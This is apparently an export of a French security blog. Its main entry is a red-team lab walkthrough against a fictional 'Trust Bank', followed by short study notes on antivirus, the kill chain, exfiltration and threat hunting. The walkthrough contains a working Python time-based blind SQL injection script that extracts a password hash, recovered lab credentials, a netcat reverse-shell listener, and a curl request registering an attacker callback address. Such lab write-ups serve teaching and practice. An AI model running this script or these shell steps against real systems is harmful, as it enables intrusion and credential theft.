id=\"nmap\"\u003enmap\u003c/h2\u003e\n\u003cp\u003enmap -sn 10.8.0.130/24\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 14:50 CEST\nNmap scan report for 10.8.0.1\nHost is up (0.10s latency).\nNmap scan report for 10.8.0.34\nHost is up (0.37s latency).\nNmap scan report for 10.8.0.46\nHost is up (0.38s latency).\nNmap scan report for 10.8.0.130\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 35.63 seconds\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003enmap -sV -sC 10.8.0.46 -v  \u0026ndash;min-rate 1000 -Pn -T4 -p-\u003c/p\u003e","title":""},{"content":"In this Red Team exercise, students will simulate a financially motivated Advanced Persistent Threat (APT) attack against \u0026ldquo;Trust Bank,\u0026rdquo; aiming to compromise the branch manager‚Äôs email account and exfiltrate sensitive financial data including internal communications all while maintaining stealth to mimic real-world banking threats like FIN7. The Red Team will go through Initial Access, Privilege Escalation, Lateral Movement \u0026amp; Data Exfiltration.\nDescription To conduct a¬†targeted cyber operation¬†against ‚ÄúTrust Bank‚Äù with the primary goal of¬†compromising the branch manager‚Äôs mailbox¬†and¬†exfiltrating sensitive financial data¬†(e.g., customer records, transaction logs, internal communications). The operation will simulate a¬†financially motivated Advanced Persistent Threat (APT)¬†attack, leveraging advanced tradecraft to evade detection while achieving mission objectives.\nScope of Engagement: Target Primary Objective:¬†Gain unauthorized mail access to the¬†branch manager‚Äôs account. Secondary Objective:¬†Extract sensitive data (PII, account details, internal memos). IP Range:¬†172.16.100.0/24 (Trust Bank‚Äôs internal network segment). Tactics \u0026amp; Techniques (Simulated APT Approach): Initial Access: Exploiting public-facing services. Privilege Escalation: Sensitive information disclosure Exploiting misconfigured service permissions. Lateral Movement: Weak protocol Implementation SSH Agent Abuse Data Exfiltration: Stealthy data compression \u0026amp; exfil via encrypted channels (DNS tunneling, HTTPS). Rules of Engagement (ROE): Avoid disruption:¬†Do not crash systems or trigger incident response unnecessarily. Legal compliance:¬†Operate under authorized red team agreements. Deliverables: Post-Compromise Report: Attack timeline \u0026amp; techniques used Security recommendations (patch weak credentials, MFA enforcement). [IMP] Flag present at the Bank Manager Mailbox ![[lab1.png]] Decouverte du reseaux Enumeration Nmap Scannons tous les h√¥tes actifs sur le r√©seau local 172.16.100.0/24 pour identifier les machines accessibles\nnmap 172.16.100.0/24 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 16:01 CEST Nmap scan report for 172.16.100.1 Host is up (0.22s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http Nmap scan report for 172.16.100.25 Host is up (0.20s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 25/tcp open smtp 143/tcp open imap 993/tcp open imaps Nmap scan report for 172.16.100.70 Host is up (0.20s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE 8080/tcp open http-proxy Nmap scan report for 172.16.100.98 Host is up (0.18s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1433/tcp open ms-sql-s 5000/tcp open upnp 5357/tcp open wsdapi Nmap scan report for 172.16.100.102 Host is up (0.21s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl La commande a permis d‚Äôidentifier 5 h√¥tes actifs sur le r√©seau 172.16.100.0/24. Cela signifie que ces machines ont r√©pondu √† des requ√™tes r√©seau et ont au moins un port ouvert.\n172.16.100.1 172.16.100.25 172.16.100.70 172.16.100.98 172.16.100.102 Machine 172.16.100.98 Enumeration PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-info: | 172.16.100.98\\MSSQLSERVER: | Instance name: MSSQLSERVER | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false | TCP port: 1433 | Named pipe: \\\\172.16.100.98\\pipe\\sql\\query |_ Clustered: false | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Issuer: commonName=SSL_Self_Signed_Fallback | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-07-04T01:28:55 | Not valid after: 2055-07-04T01:28:55 | MD5: 6f59:6c52:3bde:7eb3:03f2:43c5:86d4:4db8 |_SHA-1: ddf4:261b:fdff:f390:48e6:d13e:73f7:3035:5943:231e |_ssl-date: 2025-07-25T08:52:56+00:00; -5h18m23s from scanner time. | ms-sql-ntlm-info: | 172.16.100.98\\MSSQLSERVER: | Target_Name: SQL-SRV | NetBIOS_Domain_Name: SQL-SRV | NetBIOS_Computer_Name: SQL-SRV | DNS_Domain_Name: SQL-Srv | DNS_Computer_Name: SQL-Srv |_ Product_Version: 10.0.20348 5000/tcp open http Werkzeug httpd 3.1.3 (Python 3.13.5) | http-methods: |_ Supported Methods: GET HEAD OPTIONS |_http-server-header: Werkzeug/3.1.3 Python/3.13.5 |_http-title: SRC BANK 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: -5h18m23s, deviation: 0s, median: -5h18m23s | smb2-time: | date: 2025-07-25T08:52:49 |_ start_date: N/A Le scan r√©v√®le que l‚Äôh√¥te 172.16.100.98 expose plusieurs services critiques Windows, dont SMB et SQL Server 2019, ainsi que deux interfaces HTTP, ce qui en fait une cible potentielle pour une exploitation approfondie. la liste des ports ouverts : 135, 139, 445, 1433, 5000, 5357\nServeur Web je suis alle sur le site internet j\u0026rsquo;ai cree un compte je me suis connecte j\u0026rsquo;ai rien trouve\n![[Pasted image 20250725161630.png]]\nj\u0026rsquo;ai fais une analyse des sou-domaine j\u0026rsquo;ai rien trouve d\u0026rsquo;interressant ![[Pasted image 20250807140519.png]] apres la verification du code source j\u0026rsquo;ai trouve ceci\nhttp://172.16.100.98:5000/static/.env/Artifact_deployment.txt\n![[Pasted image 20250807140201.png]]\n[DEBUG] Injected credentials: usr: YWRtaW4ucmljaGFyZA== pss: QWRtaW5AU2VjdXJlOTk= Les identifiants inject√©s sont cod√©s en Base64 :\nusr = admin.richard pss = Admin@Secure99 je me suis connecte avec ces identifiant ![[Pasted image 20250807140333.png]]\nBlind SQL injection Blind SQL injection¬†is a type of¬†SQL injection where the attacker does not receive an obvious response from the attacked database and instead reconstructs the database structure step-by-step by observing the behavior of the database server and the application J\u0026rsquo;ai inserer ' dans le formulaire et j\u0026rsquo;ai constate que l\u0026rsquo;input est succesible d\u0026rsquo;une attaque sql\n\u0026rsquo; IF EXISTS (SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = \u0026lsquo;users\u0026rsquo; AND column_name = \u0026lsquo;password_hash\u0026rsquo;) WAITFOR DELAY \u0026lsquo;0:0:10\u0026rsquo;\u0026ndash;\n![[Pasted image 20250807142357.png]]\nPython Code to Extract the \u0026ldquo;sa\u0026rdquo; Credentials from the table via Blind SQLi import requests import time\nurl = \u0026ldquo;http://172.16.100.98:5000/admin/dashboard\u0026rdquo;\n# Replace this with your session cookie session_cookie = { \u0026#34;session\u0026#34;: \u0026#34;eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dpbl90aW1lIjoiMjAyNS0wOC0wN1QwMzo1MzoxNi41MDY0ODYiLCJ1c2VyX2lkIjoxN30.aJSFnQ.nunwVoFvyy0bKnab_aX1eV3FM2w\u0026#34; } DELAY_THRESHOLD = 4.5 # Target user and field target_user = \u0026#34;sa\u0026#34; target_field = \u0026#34;password_hash\u0026#34; charset = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$_!%^\u0026amp;*()-=+\u0026#34; # Result storage extracted = \u0026#34;\u0026#34; # How many characters of the field to extract MAX_LENGTH = 50 print(\u0026#34;[*] Starting time-based blind SQLi on authenticated endpoint...\\n\u0026#34;) for position in range(1, MAX_LENGTH + 1): found = False for char in charset: payload = ( f\u0026#34;\u0026#39; IF (SUBSTRING(CONVERT(varchar, (SELECT {target_field} FROM users \u0026#34; f\u0026#34;WHERE username = \u0026#39;{target_user}\u0026#39;)) COLLATE Latin1_General_CS_AS, {position}, 1) = \u0026#39;{char}\u0026#39;) \u0026#34; f\u0026#34;WAITFOR DELAY \u0026#39;0:0:5\u0026#39;--\u0026#34; ) print(f\u0026#34;[*] Testing position {position} with character: \u0026#39;{char}\u0026#39;\u0026#34;) try: start = time.time() r = requests.get(url, params={\u0026#39;search\u0026#39;: payload}, cookies=session_cookie) elapsed = time.time() - start print(f\u0026#34; ‚Üí Response time: {elapsed:.2f} sec\u0026#34;) if elapsed \u0026gt; DELAY_THRESHOLD: extracted += char print(f\u0026#34;[+] Match at position {position}: \u0026#39;{char}\u0026#39; ‚Üí {extracted}\\n\u0026#34;) found = True break except Exception as e: print(f\u0026#34;[!] Request error at position {position} with \u0026#39;{char}\u0026#39;: {e}\u0026#34;) time.sleep(2) if not found: print(f\u0026#34;[!] No match at position {position}. Assuming end of value.\u0026#34;) break print(f\u0026#34;\\n[‚úî] Extraction complete: {extracted}\u0026#34;) une attaque par injection SQL √† l‚Äôaveugle (Blind SQL Injection), de type \u0026ldquo;time-based\u0026rdquo;, sur une application web.\n![[Pasted image 20250807182626.png]] sa:MSSqlServer@963\nnc -lvnp 443 listening on [any] 443 ... connect to [10.10.10.10] from (UNKNOWN) [192.168.10.101] 9876 hostname SQL-Srv PS C:\\Windows\\system32\u0026gt; Machine 172.16.100.70\nEnumeration Nmap sudo nmap -Pn -sU -p 161 172.16.100.70 PORT STATE SERVICE 161/udp open snmp ![[Pasted image 20250807184900.png]]\nsudo snmpwalk -v 2c -c public 172.16.100.70 iso.3.6.1.2.1.1.1.0 = STRING: \u0026#34;SNMP Service\u0026#34; iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10 iso.3.6.1.2.1.1.3.0 = Timeticks: (219627045) 25 days, 10:04:30.45 iso.3.6.1.2.1.1.4.0 = STRING: \u0026#34;Admin \u0026lt;dev@trust-bank.ad\u0026gt;\u0026#34; iso.3.6.1.2.1.1.5.0 = STRING: \u0026#34;Passed IP will be logged in the executable file, if sent via POST request.\u0026#34; iso.3.6.1.2.1.1.6.0 = STRING: \u0026#34;http://localhost:8080/submit -d \\\u0026#34;user=root\u0026amp;ip=\u0026lt;\u0026gt;\u0026amp;port=\u0026lt;\u0026gt;\\\u0026#34;,\u0026#34; iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1 iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1 iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1 iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1 iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1 iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49 iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50 iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4 iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3 iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92 iso.3.6.1.2.1.1.9.1.3.1 = STRING: \u0026#34;The SNMP Management Architecture MIB.\u0026#34; iso.3.6.1.2.1.1.9.1.3.2 = STRING: \u0026#34;The MIB for Message Processing and Dispatching.\u0026#34; iso.3.6.1.2.1.1.9.1.3.3 = STRING: \u0026#34;The management information definitions for the SNMP User-based Security Model.\u0026#34; iso.3.6.1.2.1.1.9.1.3.4 = STRING: \u0026#34;The MIB module for SNMPv2 entities\u0026#34; iso.3.6.1.2.1.1.9.1.3.5 = STRING: \u0026#34;View-based Access Control Model for SNMP.\u0026#34; iso.3.6.1.2.1.1.9.1.3.6 = STRING: \u0026#34;The MIB module for managing TCP implementations\u0026#34; iso.3.6.1.2.1.1.9.1.3.7 = STRING: \u0026#34;The MIB module for managing UDP implementations\u0026#34; iso.3.6.1.2.1.1.9.1.3.8 = STRING: \u0026#34;The MIB module for managing IP and ICMP implementations\u0026#34; iso.3.6.1.2.1.1.9.1.3.9 = STRING: \u0026#34;The MIB modules for managing SNMP Notification, plus filtering.\u0026#34; iso.3.6.1.2.1.1.9.1.3.10 = STRING: \u0026#34;The MIB module for logging SNMP Notifications.\u0026#34; iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.25.1.1.0 = Timeticks: (228143547) 26 days, 9:43:55.47 iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 08 07 11 09 13 00 2B 05 1E iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216 iso.3.6.1.2.1.25.1.4.0 = STRING: \u0026#34;BOOT_IMAGE=/boot/vmlinuz-6.8.0-41-generic root=UUID=419ff7ed-938c-4d3b-b665-bf35581c8097 ro quiet splash vt.handoff=7 \u0026#34; iso.3.6.1.2.1.25.1.5.0 = Gauge32: 2 iso.3.6.1.2.1.25.1.6.0 = Gauge32: 277 iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0 iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MI curl -X POST http://172.16.100.70:8080/submit -d \u0026ldquo;user=root\u0026amp;ip=10.10.10.10\u0026amp;port=1234\u0026rdquo; Stored 10.10.10.10:1234 for root,\nNow run this from your machine: snmpwalk -v2c -c privatestring \u0026lt;target_ip\u0026gt; NET-SNMP-EXTEND-MIB::nsExtendOutput1Line\n","permalink":"https://nyobemichel.me/posts/labs/trust-bank-breach/","summary":"\u003cp\u003eIn this Red Team exercise, students will simulate a financially motivated Advanced Persistent Threat (APT) attack against \u0026ldquo;Trust Bank,\u0026rdquo; aiming to compromise the branch manager‚Äôs email account and exfiltrate sensitive financial data including internal communications all while maintaining stealth to mimic real-world banking threats like FIN7. The Red Team will go through Initial Access, Privilege Escalation, Lateral Movement \u0026amp; Data Exfiltration.\u003c/p\u003e\n\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\u003cp\u003eTo conduct a¬†\u003cstrong\u003etargeted cyber operation\u003c/strong\u003e¬†against ‚Äú\u003cstrong\u003eTrust Bank\u003c/strong\u003e‚Äù with the primary goal of¬†\u003cstrong\u003ecompromising the branch manager‚Äôs mailbox\u003c/strong\u003e¬†and¬†\u003cstrong\u003eexfiltrating sensitive financial data\u003c/strong\u003e¬†(e.g., customer records, transaction logs, internal communications). The operation will simulate a¬†\u003cstrong\u003efinancially motivated Advanced Persistent Threat (APT)\u003c/strong\u003e¬†attack, leveraging advanced tradecraft to evade detection while achieving mission objectives.\u003c/p\u003e","title":""},{"content":"En tant que membre de l\u0026rsquo;√©quipe rouge de Secure Corp, votre mission est d\u0026rsquo;exploiter une vuln√©rabilit√© dans un plugin WordPress utilis√© pour la gestion des ressources num√©riques. Cette faille peut permettre un acc√®s distant non autoris√© au serveur, vous permettant ainsi de compromettre le syst√®me en ex√©cutant du code arbitraire.\nEnumeration Nmap version de wordpress WordPress 6.7.1\ncurl -s -X GET https://red.infinity.cyberwarfare.live/jf159070e9264f91970a7b64e17d775t/ | grep \u0026#39;\u0026lt;meta name=\u0026#34;generator\u0026#34;\u0026#39; \u0026lt;meta name=\u0026#34;generator\u0026#34; content=\u0026#34;WordPress 6.7.1\u0026#34; /\u0026gt; ","permalink":"https://nyobemichel.me/posts/labs/vulnerable-canto-wordpress-plugin/","summary":"\u003cp\u003eEn tant que membre de l\u0026rsquo;√©quipe rouge de Secure Corp, votre mission est d\u0026rsquo;exploiter une vuln√©rabilit√© dans un plugin WordPress utilis√© pour la gestion des ressources num√©riques. Cette faille peut permettre un acc√®s distant non autoris√© au serveur, vous permettant ainsi de compromettre le syst√®me en ex√©cutant du code arbitraire.\u003c/p\u003e\n\u003ch1 id=\"enumeration\"\u003eEnumeration\u003c/h1\u003e\n\u003ch2 id=\"nmap\"\u003eNmap\u003c/h2\u003e\n\u003cp\u003eversion de wordpress  \u003ccode\u003eWordPress 6.7.1\u003c/code\u003e\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecurl -s -X GET https://red.infinity.cyberwarfare.live/jf159070e9264f91970a7b64e17d775t/ | grep \u0026#39;\u0026lt;meta name=\u0026#34;generator\u0026#34;\u0026#39; \n\u0026lt;meta name=\u0026#34;generator\u0026#34; content=\u0026#34;WordPress 6.7.1\u0026#34; /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e","title":""},{"content":"Les logiciels antivirus (¬†AV¬†) sont l\u0026rsquo;une des solutions de s√©curit√© essentielles pour d√©tecter et pr√©venir les attaques de logiciels malveillants¬†sur la machine de l\u0026rsquo;utilisateur final¬†.\nTechniques de d√©tection Une technique de d√©tection¬†AV¬†recherche et d√©tecte les fichiers malveillants¬†; diff√©rentes techniques de d√©tection peuvent √™tre utilis√©es au sein du¬†moteur¬†AV , notamment¬†:\nLa d√©tection bas√©e sur les signatures est la technique¬†AV¬†traditionnelle qui recherche des mod√®les et des signatures malveillants pr√©d√©finis dans les fichiers. La d√©tection heuristique est une technique plus avanc√©e qui comprend diverses m√©thodes comportementales pour analyser les fichiers suspects. La d√©tection dynamique est une technique qui comprend la surveillance des appels syst√®me et des API, ainsi que les tests et les analyses dans un environnement isol√©. ","permalink":"https://nyobemichel.me/posts/learn/antivirus/","summary":"\u003cp\u003eLes logiciels antivirus (¬†AV¬†) sont l\u0026rsquo;une des solutions de s√©curit√© essentielles pour d√©tecter et pr√©venir les attaques de logiciels malveillants¬†sur la machine de l\u0026rsquo;utilisateur final¬†.\u003c/p\u003e\n\u003ch1 id=\"techniques-de-d√©tection\"\u003eTechniques de d√©tection\u003c/h1\u003e\n\u003cp\u003eUne technique de d√©tection¬†AV¬†recherche et d√©tecte les fichiers malveillants¬†; diff√©rentes techniques de d√©tection peuvent √™tre utilis√©es au sein du¬†moteur¬†AV , notamment¬†:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLa d√©tection bas√©e sur les signatures est la technique¬†AV¬†traditionnelle qui recherche des mod√®les et des signatures malveillants pr√©d√©finis dans les fichiers.\u003c/li\u003e\n\u003cli\u003eLa d√©tection heuristique est une technique plus avanc√©e qui comprend diverses m√©thodes comportementales pour analyser les fichiers suspects.\u003c/li\u003e\n\u003cli\u003eLa d√©tection dynamique est une technique qui comprend la surveillance des appels syst√®me et des API, ainsi que les tests et les analyses dans un environnement isol√©.\u003c/li\u003e\n\u003c/ul\u003e","title":""},{"content":"La certification Burp Suite Certified Practitioner (BSCP) est une certification officielle destin√©e aux professionnels de la s√©curit√© web, d√©livr√©e par les cr√©ateurs de Burp Suite\n","permalink":"https://nyobemichel.me/posts/learn/burp-suite-certified-practitioner-bscp/","summary":"\u003cp\u003eLa certification Burp Suite Certified Practitioner (BSCP) est une certification officielle destin√©e aux professionnels de la s√©curit√© web, d√©livr√©e par les cr√©ateurs de Burp Suite\u003c/p\u003e","title":""},{"content":"Inspir√©e des cha√Ænes de destruction militaires, la Cyber ‚Äã‚ÄãKill Chain est un cadre de cybers√©curit√© introduit par Lockheed Martin en 2011. Elle vise √† aider les organisations √† se d√©fendre contre les cyberattaques en comprenant leur d√©roulement. La Cyber ‚Äã‚ÄãKill Chain divise une attaque en sept √©tapes¬†:\nReconnaissance¬†: Dans la premi√®re √©tape, l\u0026rsquo;attaquant recueille des informations sur la cible Armement¬†: Une fois la reconnaissance appropri√©e effectu√©e, l\u0026rsquo;attaquant cr√©e une charge utile livrable ou modifie une charge utile existante en fonction des vuln√©rabilit√©s du syst√®me cible Livraison¬†: Une fois pr√™te, l\u0026rsquo;attaquant envoie la charge utile arm√©e √† la cible Exploitation¬†: Une fois ex√©cut√©e, la charge utile exploite une vuln√©rabilit√© dans le syst√®me de la cible Installation¬†: L\u0026rsquo;exploitation permet √† l\u0026rsquo;attaquant d\u0026rsquo;installer une porte d√©rob√©e ou un logiciel malveillant pour maintenir¬†la persistance¬†dans l\u0026rsquo;environnement de la cible Commande et contr√¥le (¬†C2¬†)¬†: En utilisant la porte d√©rob√©e install√©e, l\u0026rsquo;attaquant peut contr√¥ler le syst√®me compromis Actions sur les objectifs¬†: En arrivant jusqu\u0026rsquo;ici, l\u0026rsquo;attaquant peut d√©sormais effectuer d\u0026rsquo;autres actions telles que l\u0026rsquo;exfiltration de donn√©es ou l\u0026rsquo;exploitation d\u0026rsquo;autres syst√®mes Reconnaissance La reconnaissance trouve son origine dans le domaine militaire et d√©signe l\u0026rsquo;acte de recueillir des informations sur une cible. En cybers√©curit√©, cette √©tape consiste √† recueillir des informations sur les vuln√©rabilit√©s et les faiblesses de la cible afin de d√©couvrir des points d\u0026rsquo;entr√©e potentiels.\n","permalink":"https://nyobemichel.me/posts/learn/cyber-kill-chain/","summary":"\u003cp\u003eInspir√©e des cha√Ænes de destruction militaires, la Cyber ‚Äã‚ÄãKill Chain est un cadre de cybers√©curit√© introduit par Lockheed Martin en 2011. Elle vise √† aider les organisations √† se d√©fendre contre les cyberattaques en comprenant leur d√©roulement.\nLa Cyber ‚Äã‚ÄãKill Chain divise une attaque en sept √©tapes¬†:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eReconnaissance\u003c/strong\u003e¬†: Dans la premi√®re √©tape, l\u0026rsquo;attaquant recueille des informations sur la cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eArmement\u003c/strong\u003e¬†: Une fois la reconnaissance appropri√©e effectu√©e, l\u0026rsquo;attaquant cr√©e une charge utile livrable ou modifie une charge utile existante en fonction des vuln√©rabilit√©s du syst√®me cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLivraison\u003c/strong\u003e¬†: Une fois pr√™te, l\u0026rsquo;attaquant envoie la charge utile arm√©e √† la cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExploitation\u003c/strong\u003e¬†: Une fois ex√©cut√©e, la charge utile exploite une vuln√©rabilit√© dans le syst√®me de la cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eInstallation\u003c/strong\u003e¬†: L\u0026rsquo;exploitation permet √† l\u0026rsquo;attaquant d\u0026rsquo;installer une porte d√©rob√©e ou un logiciel malveillant pour maintenir¬†la persistance¬†dans l\u0026rsquo;environnement de la cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommande et contr√¥le (¬†C2¬†)\u003c/strong\u003e¬†: En utilisant la porte d√©rob√©e install√©e, l\u0026rsquo;attaquant peut contr√¥ler le syst√®me compromis\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActions sur les objectifs\u003c/strong\u003e¬†: En arrivant jusqu\u0026rsquo;ici, l\u0026rsquo;attaquant peut d√©sormais effectuer d\u0026rsquo;autres actions telles que l\u0026rsquo;exfiltration de donn√©es ou l\u0026rsquo;exploitation d\u0026rsquo;autres syst√®mes\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cp\u003eLa reconnaissance trouve son origine dans le domaine militaire et d√©signe l\u0026rsquo;acte de recueillir des informations sur une cible. En cybers√©curit√©, cette √©tape consiste √† recueillir des informations sur les vuln√©rabilit√©s et les faiblesses de la cible afin de d√©couvrir des points d\u0026rsquo;entr√©e potentiels.\u003c/p\u003e","title":""},{"content":"Qu\u0026rsquo;est-ce que l\u0026rsquo;exfiltration de donn√©es L\u0026rsquo;exfiltration de donn√©es consiste √† copier des donn√©es sensibles de mani√®re non autoris√©e et √† les transf√©rer de l\u0026rsquo;int√©rieur du r√©seau d\u0026rsquo;une organisation vers l\u0026rsquo;ext√©rieur.\nIl existe trois principaux sc√©narios d‚Äôutilisation de l‚Äôexfiltration de donn√©es, notamment¬†:\nExfiltrer les donn√©es Communications de commandement et de contr√¥le. Tunneling Exfiltration √† l\u0026rsquo;aide du socket TCP ","permalink":"https://nyobemichel.me/posts/learn/exfiltration-de-donn%C3%A9es/","summary":"\u003ch1 id=\"quest-ce-que-lexfiltration-de-donn√©es\"\u003eQu\u0026rsquo;est-ce que l\u0026rsquo;exfiltration de donn√©es\u003c/h1\u003e\n\u003cp\u003eL\u0026rsquo;exfiltration de donn√©es consiste √† copier des donn√©es sensibles de mani√®re non autoris√©e et √† les transf√©rer de l\u0026rsquo;int√©rieur du r√©seau d\u0026rsquo;une organisation vers l\u0026rsquo;ext√©rieur.\u003c/p\u003e\n\u003cp\u003eIl existe trois principaux sc√©narios d‚Äôutilisation de l‚Äôexfiltration de donn√©es, notamment¬†:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eExfiltrer les donn√©es\u003c/li\u003e\n\u003cli\u003eCommunications de commandement et de contr√¥le.\u003c/li\u003e\n\u003cli\u003eTunneling\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"exfiltration-√†-laide-du-socket-tcp\"\u003eExfiltration √† l\u0026rsquo;aide du socket TCP\u003c/h2\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/learn/identity-secure-score/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/learn/lacc%C3%A8s-conditionnel/","summary":"","title":""},{"content":"Static Application Security Testing\n","permalink":"https://nyobemichel.me/posts/learn/sast/","summary":"\u003cp\u003eStatic Application Security Testing\u003c/p\u003e","title":""},{"content":"Introduction √† la chasse aux menaces Les aspects cl√©s de la chasse aux menaces comprennent :\nUne strat√©gie offensive proactivequi privil√©gie l‚Äôanticipation des menaces plut√¥t que la r√©action, bas√©e sur des hypoth√®ses, les TTP des attaquants et les renseignements. Une r√©ponse offensive reactivequi recherche sur le r√©seau des artefacts li√©s √† un verifiedincident, sur la base de preuves et de renseignements. Une compr√©hension solide et pratique du paysage des menaces, des cybermenaces, des TTP adverses et de la cha√Æne de destruction cybern√©tique. Empathie cognitive avec l‚Äôagresseur, favorisant la compr√©hension de l‚Äô√©tat d‚Äôesprit de l‚Äôadversaire. Une connaissance approfondie de l\u0026rsquo;environnement informatique de l\u0026rsquo;organisation, de la topologie du r√©seau, des actifs num√©riques et de l\u0026rsquo;activit√© normale. Utilisation de donn√©es haute fid√©lit√© et d‚Äôanalyses tactiques, et exploitation d‚Äôoutils et de plateformes avanc√©s de recherche de menaces. Structure d\u0026rsquo;une √©quipe de chasse aux menaces La constitution d\u0026rsquo;une √©quipe de chasse aux menaces est un processus strat√©gique et minutieusement planifi√© qui requiert des comp√©tences, une expertise et des perspectives diversifi√©es. Il est crucial que chaque membre de l\u0026rsquo;√©quipe poss√®de un ensemble de comp√©tences uniques qui, combin√©es, offrent une approche globale et compl√®te pour identifier, att√©nuer et √©liminer les menaces.\nLa composition id√©ale d\u0026rsquo;une √©quipe de chasse aux menaces comprend g√©n√©ralement les r√¥les suivants :\nThreat HunterAu sein de l\u0026rsquo;√©quipe, les chasseurs de menaces sont des professionnels de la cybers√©curit√© poss√©dant une connaissance approfondie du paysage des menaces, des tactiques, techniques et proc√©dures (TTP) des cyberadversaires et des m√©thodologies sophistiqu√©es de d√©tection des menaces. Threat Intelligence AnalystCes personnes sont charg√©es de collecter et d\u0026rsquo;analyser des donn√©es provenant de diverses sources, notamment des renseignements provenant de sources ouvertes, du dark web, des rapports sectoriels et des flux de menaces. Incident RespondersLorsque les chasseurs de menaces identifient des menaces potentielles, les intervenants en cas d\u0026rsquo;incident interviennent pour g√©rer la situation. Forensics Experts:Il s\u0026rsquo;agit des membres de l\u0026rsquo;√©quipe qui analysent en profondeur les d√©tails techniques d\u0026rsquo;un incident. Data Analysts/Scientists:Ils jouent un r√¥le essentiel dans l‚Äôexamen de grands ensembles de donn√©es, en utilisant des mod√®les statistiques, des algorithmes d‚Äôapprentissage automatique et des techniques d‚Äôexploration de donn√©es pour d√©couvrir des mod√®les, des corr√©lations et des tendances qui peuvent conduire √† des informations exploitables pour les chasseurs de menaces. Security Engineers/ArchitectsLes ing√©nieurs en s√©curit√© 